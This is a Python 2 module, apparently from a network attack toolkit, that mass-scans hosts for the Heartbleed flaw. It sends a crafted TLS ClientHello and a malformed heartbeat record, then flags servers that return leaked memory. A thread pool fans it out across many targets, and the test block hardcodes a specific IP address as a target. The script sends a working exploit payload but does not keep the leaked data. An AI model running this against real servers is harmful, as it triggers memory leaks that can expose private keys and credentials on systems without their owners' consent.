#!/usr/bin/python
import sys
import struct
import socket
import select
import time
import threading
from printers import printPink,printRed
from multiprocessing.dummy import Pool

class ssl_burp(object):
    
    def __init__(self,c):
        self.config=c
        self.lock=threading.Lock()
        self.result=[]

        self.hello = self.h2bin('''
        16 03 02 00  dc 01 00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
        00 0f 00 01 01
        ''')

        self.hb = self.h2bin('''
        18 03 02 00 03
        01 40 00
        ''')


    def h2bin(self,x):
        return x.replace(' ', '').replace('\n', '').decode('hex')


    def recvall(self,s, length, timeout=8):
        endtime = time.time() + timeout
        rdata = ''
        remain = length
        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                return None
            r, w, e = select.select([s], [], [], 5)
            if s in r:
                data = s.recv(remain)
                # EOF?
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata

    def recvmsg(self,s):
        hdr = self.recvall(s, 5)
        if hdr is None:
            return None, None, None
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = self.recvall(s, ln, 10)
        return typ, ver, pay


    def hit_hb(self,s,ip,port):
        s.send(self.hb)
        while True:
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                return False

            if typ == 24:
                if len(pay) > 3:
                    self.lock.acquire()
                    printRed('WARNING: %s ssl at %s returned more data than it should - server is vulnerable!\r\n' %(ip,port))
                    self.result.append('WARNING: %s ssl at %s returned more data than it should - server is vulnerable!\r\n' %(ip,port))
                    self.lock.release()
                else:
                    self.lock.acquire()
                    printRed('%s ssl at %s processed malformed heartbeat, but did not return any extra data.\r\n' %(ip,port))
                    self.result.append('%s ssl at %s processed malformed heartbeat, but did not return any extra data.\r\n' %(ip,port))
                    self.lock.release()
                return True

            if typ == 21:
                return False

    def openssl_test(self,ip,port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sys.stdout.flush()
                s.connect((ip, port))
                sys.stdout.flush()
                s.send(self.hello)
                sys.stdout.flush()
                while True:
                    typ, ver, pay = self.recvmsg(s)
                    if typ == None:
                        break
                    # Look for server hello done message.
                    if typ == 22 and ord(pay[0]) == 0x0E:
                        break
                sys.stdout.flush()
                s.send(self.hb)
                self.hit_hb(s,ip,port)
            except Exception,e:
                #print e
                pass


    def run(self,ipdict,pinglist,threads,file):
        if len(ipdict['ssl']):
            printPink("crack ssl  now...")
            print "[*] start test openssl_heart  %s" % time.ctime()
            starttime=time.time()

            pool=Pool(threads)
            for ip in ipdict['ssl']:
                pool.apply_async(func=self.openssl_test,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))
            pool.close()
            pool.join()

            print "[*] stop ssl serice  %s" % time.ctime()
            print "[*] crack ssl done,it has Elapsed time:%s " % (time.time()-starttime)

            for i in xrange(len(self.result)):
                self.config.write_file(contents=self.result[i],file=file)   

if __name__ == '__main__':
    import sys
    sys.path.append("../")
    from comm.config import *
    c=config()
    ipdict={'ssl': ['222.22.224.142:443']} 
    pinglist=['122.225.81.129']
    test=ssl_burp(c)
    test.run(ipdict,pinglist,50,file="../result/test")
